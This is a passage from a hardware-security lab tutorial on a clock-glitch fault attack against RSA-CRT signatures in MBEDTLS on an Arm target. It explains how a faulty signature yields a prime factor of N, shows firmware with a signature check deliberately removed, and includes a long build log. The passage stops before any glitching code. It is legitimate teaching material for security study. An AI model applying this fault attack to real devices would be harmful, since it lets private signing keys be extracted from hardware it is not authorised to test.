
RSA FaultAttack
===============

Supported setups:

SCOPES:

-  OPENADC

PLATFORMS:

-  CWLITEARM

This advanced tutorial will demonstrate an attack on RSA signatures that
use the Chinese Remainder Theorem as an optimization. This tutorial will
make use of glitching, so it's recommended that you complete at least
Fault\_1-Introduction\_to\_Clock\_Glitch\_Attacks before attempting this
tutorial. You may also want to install gmpy2 before running this
tutorial, as it makes a later section of the tutorial much faster. Linux
users can install this via their package manager, Mac users via Brew,
and Windows users via the `Unofficial Windows Python
Binaries <https://www.lfd.uci.edu/~gohlke/pythonlibs/>`__.

Additionally, this tutorial has been designed for Arm targets only.
Users of other hardware will likely need to make changes to available
RSA libraries to complete this tutorial.

This attack is was originally detailed in a `1997 paper by Boneh,
Demillo, and
Lipton <https://www.researchgate.net/publication/2409434_On_the_Importance_of_Checking_Computations>`__.
This tutorial draws heavily from a blog post by David Wong, which you
can find
`here <https://www.cryptologie.net/article/371/fault-attacks-on-rsas-signatures/>`__.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEARM'

Attack Theory
-------------

We won't cover much about what RSA (there's a `Wikipedia
article <https://en.wikipedia.org/wiki/RSA_(cryptosystem)>`__ for that),
but we will give a quick summary.

-  RSA is a public key crypto system. It can be used in a few different
   ways, but we'll be using it for signing messages in this case. In
   this mode, User A can sign a message using their private information.
   User B can then verify that User A was the one who signed the message
   using publically available information.
-  This means that some information is public, while other information
   is private.
-  Public information includes the public modulus N, and the public
   exponent e
-  Private information includes the private exponent d, as well as p and
   q, which are prime factors of N
-  The public information can be freely shared, but learning any private
   information compromises the whole system

The math of RSA (once you have all the key parts generated) is actually
pretty simple. To sign the message, the following equation can be
applied (with signature s, message m, private exponent d, and public
modulus N):

.. math:: s = m^d({mod}\ N)

To verify a signature, the following equation is used (with signature s,
public exponent e, message m, and public modulus N):

.. math:: s^e = m(mod\ N)

Despite the simplicity of these equations, signing messages in
particular is a very slow operation, with the implementation from
MBEDTLS, a popular crypto library for Arm devices, taking over 12M
cycles for RSA-1024 (and this is with the optimization we make in the
next section). This is because all of the numbers used in these
equations are huge (n and d are 1024 bits long in this case). As you can
imagine, any improvement we can make to the speed of this operation is
very important. It turns out there is a large speed optimization that we
can make.

Chinese Remainder Theorem (CRT)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of computing :math:`s = m^d(mod\ N)`, we can instead break N
into two primes, p and q, such that :math:`n = pq`, then use those to
calculate the signature instead of N. As you might have guessed, p and q
are the same private information we talked about earlier. Bascially, if
we learn either, we'll be able to derive the rest of the private
information fairly easily. We won't go into all the math, but here's the
important operations:

-  Derive :math:`d_p` from d and p and :math:`d_q` from d and q
-  Calculate: :math:`s_1 = m^{d_p}(mod\ p)` and
   :math:`s_2 = m^{d_q}(mod\ q)`
-  Combine :math:`s_1` and :math:`s_2` into :math:`s` via CRT

Since p and q are much smaller than N, creating signatures is much much
faster this way. As such, many popular RSA implementations (including
MBEDTLS) use CRT to speed up RSA.

CRT Attack
~~~~~~~~~~

Suppose that instead of everything going smoothly as above, a fault
happens during the calculation of :math:`s_1` or :math:`s_2` (we'll
assume that the fault was with :math:`s_2` here, which will become
:math:`s^{'}_{2}`). If that happens, the following becomes true (with
faulty signatures :math:`s_2'`, which generates :math:`s'`):

.. math:: s'^e = m(mod\ p) \Rightarrow s'^e - m = 0 (mod\ p)

.. math:: s'^e \neq m(mod\ q) \Rightarrow s'^e - m \neq 0 (mod\ q)

The result of this is that p will be a factor of :math:`s'^e - m`, but q
and N will not be. Since p is also a factor of N, what follows is that:

.. math:: p = gcd(s'^e - m, N)

Thus, if we introduce a fault in the calculation of either :math:`s_1`
or :math:`s_2`, we'll be able to get either q or p, and from there the
rest of the private values!

Firmware
--------

Next, let's take a look at the RSA implementation we're attacking. For
this attack, we'll be using the ``simpleserial-rsa-arm`` project folder.
There's a few files here, but the important one is
``simpleserial-arm-rsa.c``. Open it. As you scroll through, you'll find
all our public/private values. Next, navigate to ``real_dec()``:

.. code:: c

    uint8_t buf[128];
    uint8_t hash[32];
    uint8_t real_dec(uint8_t *pt)
    {
         int ret = 0;

         //first need to hash our message
         memset(buf, 0, 128);
         mbedtls_sha256(MESSAGE, 12, hash, 0);

         trigger_high();
         ret = simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign(&rsa_ctx, NULL, NULL, MBEDTLS_RSA_PRIVATE, MBEDTLS_MD_SHA256, 32, hash, buf);
         trigger_low();

         //send back first 48 bytes
         simpleserial_put('r', 48, buf);
         return ret;
    }

You'll notice that we first hash our message (``"Hello World!"``) using
SHA256. Once this is passed to the signature function, it will be padded
according to the PKCS#1 v1.5 standard. This isn't too important now, but
it will be important later. Next we sign our message using
``simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()``, then send back the
first 48 bytes of it. We'll be sending the signature back in multiple
chunks to avoid overflowing the CWLite's buffer of 128 bytes via
``sig_chunk_1()`` and ``sig_chunk_2()`` directly below this function.

We'll actually skip over
``simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()`` here, since most of
the important stuff actually happens in a different function. You should
note, however, that this function has been modified to remove a
signature check, which would need to be bypassed in a real attack.

Next, find the function ``simpleserial_mbedtls_rsa_private()``, a
cleaned up version of ``mbedtls_rsa_private()``, where the signature
calculation actually happens:

.. code:: c

    /*
     * Do an RSA private key operation
     */
    static int simpleserial_mbedtls_rsa_private( mbedtls_rsa_context *ctx,
                     int (*f_rng)(void *, unsigned char *, size_t),
                     void *p_rng,
                     const unsigned char *input,
                     unsigned char *output )

scrolling down a bit, we do indeed find that this function uses CRT to
speed up the calculation:

.. code:: c

        /*
         * Faster decryption using the CRT
         *
         * T1 = input ^ dP mod P
         * T2 = input ^ dQ mod Q
         */
        MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T1, &T, DP, &ctx->P, &ctx->RP ) );
        MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T2, &T, DQ, &ctx->Q, &ctx->RQ ) );

You can view more of the firmware if you want, but for now let's build
our firmware and then move over to our python script:


**In [2]:**

.. code:: ipython3

    CRYPTO_TARGET="MBEDTLS"
    CRYPTO_OPTIONS="RSA"
    NANO_FLASH = "NA"
    OPT = "2"
    if SCOPETYPE == "CWNANO":
        NANO_FLASH = "32K" #Need nano pro 32
        OPT = "2"


**In [3]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET" "$CRYPTO_OPTIONS" "$NANO_FLASH"
    cd ../hardware/victims/firmware/simpleserial-rsa
    make PLATFORM=$1 CRYPTO_TARGET=$2 CRYPTO_OPTIONS=$3 OPT=2 NANO_FLASH=$4


**Out [3]:**



.. parsed-literal::

    rm -f -- simpleserial-rsa-CWLITEARM.hex
    rm -f -- simpleserial-rsa-CWLITEARM.eep
    rm -f -- simpleserial-rsa-CWLITEARM.cof
    rm -f -- simpleserial-rsa-CWLITEARM.elf
    rm -f -- simpleserial-rsa-CWLITEARM.map
    rm -f -- simpleserial-rsa-CWLITEARM.sym
    rm -f -- simpleserial-rsa-CWLITEARM.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- simpleserial-rsa.s simpleserial-rsa-xmega.s simpleserial-rsa-arm.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s rsa.s bignum.s md.s md5.s md_wrap.s sha1.s sha256.s sha512.s ripemd160.s oid.s
    rm -f -- simpleserial-rsa.d simpleserial-rsa-xmega.d simpleserial-rsa-arm.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d rsa.d bignum.d md.d md5.d md_wrap.d sha1.d sha256.d sha512.d ripemd160.d oid.d
    rm -f -- simpleserial-rsa.i simpleserial-rsa-xmega.i simpleserial-rsa-arm.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i rsa.i bignum.i md.i md5.i md_wrap.i sha1.i sha256.i sha512.i ripemd160.i oid.i
    .
    -------- begin --------
    arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]
    Copyright (C) 2017 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: simpleserial-rsa.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa.o.d simpleserial-rsa.c -o objdir/simpleserial-rsa.o 
    .
    Compiling C: simpleserial-rsa-xmega.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa-xmega.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa-xmega.o.d simpleserial-rsa-xmega.c -o objdir/simpleserial-rsa-xmega.o 
    .
    Compiling C: simpleserial-rsa-arm.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa-arm.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa-arm.o.d simpleserial-rsa-arm.c -o objdir/simpleserial-rsa-arm.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o 
    .
    Compiling C: .././crypto/mbedtls//library/rsa.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/rsa.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/rsa.o.d .././crypto/mbedtls//library/rsa.c -o objdir/rsa.o 
    .
    Compiling C: .././crypto/mbedtls//library/bignum.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/bignum.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/bignum.o.d .././crypto/mbedtls//library/bignum.c -o objdir/bignum.o 
    .
    Compiling C: .././crypto/mbedtls//library/md.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/md.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/md.o.d .././crypto/mbedtls//library/md.c -o objdir/md.o 
    .
    Compiling C: .././crypto/mbedtls//library/md5.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/md5.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/md5.o.d .././crypto/mbedtls//library/md5.c -o objdir/md5.o 
    .
    Compiling C: .././crypto/mbedtls//library/md_wrap.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/md_wrap.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/md_wrap.o.d .././crypto/mbedtls//library/md_wrap.c -o objdir/md_wrap.o 
    .
    Compiling C: .././crypto/mbedtls//library/sha1.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/sha1.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/sha1.o.d .././crypto/mbedtls//library/sha1.c -o objdir/sha1.o 
    .
    Compiling C: .././crypto/mbedtls//library/sha256.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/sha256.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/sha256.o.d .././crypto/mbedtls//library/sha256.c -o objdir/sha256.o 
    .
    Compiling C: .././crypto/mbedtls//library/sha512.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/sha512.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/sha512.o.d .././crypto/mbedtls//library/sha512.c -o objdir/sha512.o 
    .
    Compiling C: .././crypto/mbedtls//library/ripemd160.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/ripemd160.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/ripemd160.o.d .././crypto/mbedtls//library/ripemd160.c -o objdir/ripemd160.o 
    .
    Compiling C: .././crypto/mbedtls//library/oid.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/oid.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/oid.o.d .././crypto/mbedtls//library/oid.c -o objdir/oid.o 
    .
    Assembling: .././hal/stm32f3/stm32f3_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o
    .
    Linking: simpleserial-rsa-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa-CWLITEARM.elf.d objdir/simpleserial-rsa.o objdir/simpleserial-rsa-xmega.o objdir/simpleserial-rsa-arm.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/rsa.o objdir/bignum.o objdir/md.o objdir/md5.o objdir/md_wrap.o objdir/sha1.o objdir/sha256.o objdir/sha512.o objdir/ripemd160.o objdir/oid.o objdir/stm32f3_startup.o --output simpleserial-rsa-CWLITEARM.elf --specs=nano.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=simpleserial-rsa-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: simpleserial-rsa-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-rsa-CWLITEARM.elf simpleserial-rsa-CWLITEARM.hex
    .
    Creating load file for EEPROM: simpleserial-rsa-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-rsa-CWLITEARM.elf simpleserial-rsa-CWLITEARM.eep || exit 0
    .
    Creating Extended Listing: simpleserial-rsa-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z simpleserial-rsa-CWLITEARM.elf > simpleserial-rsa-CWLITEARM.lss
    .
    Creating Symbol Table: simpleserial-rsa-CWLITEARM.sym
    arm-none-eabi-nm -n simpleserial-rsa-CWLITEARM.elf > simpleserial-rsa-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
      20956	    108	   1820	  22884	   5964	simpleserial-rsa-CWLITEARM.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm (STM32F3)
    +--------------------------------------------------------





.. parsed-literal::

    simpleserial-rsa-arm.c: In function 'simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign':
    simpleserial-rsa-arm.c:190:28: warning: unused variable 'diff_no_optimize' [-Wunused-variable]
         volatile unsigned char diff_no_optimize;
                                ^~~~~~~~~~~~~~~~
    simpleserial-rsa-arm.c:189:19: warning: unused variable 'diff' [-Wunused-variable]
         unsigned char diff;
                       ^~~~
    simpleserial-rsa-arm.c:188:12: warning: unused variable 'i' [-Wunused-variable]
         size_t i;
                ^
    simpleserial-rsa-arm.c: In function 'real_dec':
    simpleserial-rsa-arm.c:344:21: warning: pointer targets in passing argument 1 of 'mbedtls_sha256' differ in signedness [-Wpointer-sign]
          mbedtls_sha256(MESSAGE, 12, hash, 0);
                         ^~~~~~~
    In file included from simpleserial-rsa-arm.c:28:0:
